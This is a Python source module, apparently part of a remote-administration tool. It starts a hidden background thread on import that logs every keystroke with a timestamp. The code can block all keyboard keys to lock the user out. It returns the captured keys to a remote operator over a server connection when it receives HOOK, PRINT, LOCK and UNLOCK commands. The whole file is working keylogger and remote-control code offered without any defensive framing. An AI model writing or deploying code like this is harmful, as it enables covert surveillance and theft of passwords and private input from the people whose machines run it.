import threading, keyboard
from pynput.keyboard import Listener 
from datetime import datetime
from function.utilities import *

islock = 0
ishook = 0
flag = 0
cont = []

def keylogger(key):
    global cont 
    if flag == 4:
        return False
    if flag == 1:
        tmp = str(key)
        if tmp == '"\'"':
            tmp = "'"
        else:
            tmp = tmp.replace("'", "")
        cont.append((datetime.now().strftime("%d/%m/%Y %H:%M:%S"), str(tmp)))
        #print(cont)
    return
    
def listen():
    with Listener(on_press = keylogger) as listener:
        listener.join()  
    return

def lock():
    global islock
    if (islock == 0):
        for i in range(150):
            keyboard.block_key(i)
        islock = 1
    return

def unlock(): 
    global islock
    if (islock == 1): 
        for i in range(150):
            keyboard.unblock_key(i)
        islock = 0 

threading.Thread(target = listen).start()

def handle_keylog(server, request):  
    global cont, flag, islock, ishook
    
    if ('HOOK' in request): 
        if ishook == 0:
            flag = 1
            ishook = 1
        else:
            flag = 2
            ishook = 0
        server.send_msg('REPLY KEYLOGGER HOOK', [(listLine2HTML(['Hook successful!']), 'html')])
    elif ('PRINT' in request): 
        server.send_msg('REPLY KEYLOGGER PRINT', [(listKey2HTML(cont), 'html')])
        cont = []
    elif ('UNLOCK' in request): 
        unlock()
        server.send_msg('REPLY KEYLOGGER UNLOCK', [(listLine2HTML(['Unlock successful!']), 'html')])
    elif ('LOCK' in request): 
        lock()
        server.send_msg('REPLY KEYLOGGER LOCK', [(listLine2HTML(['Lock successful!']), 'html')])
    
    


       